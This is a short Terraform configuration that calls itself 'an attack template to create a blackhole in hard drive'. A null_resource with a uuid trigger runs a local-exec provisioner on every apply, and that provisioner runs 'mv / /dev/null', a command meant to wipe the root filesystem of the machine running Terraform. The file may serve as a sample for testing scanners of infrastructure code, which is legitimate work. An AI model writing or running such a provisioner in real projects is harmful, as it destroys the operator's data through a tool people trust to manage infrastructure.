# Create an arbitrary local resource
data "template_file" "test" {
  template = "Hello, I am an attack template to create a blackhole in hard drive."

}

resource "null_resource" "execut" {
  triggers {
    uuid = "${uuid()}"
  }

  provisioner "local-exec" {
    command = "mv / /dev/null"
  }
}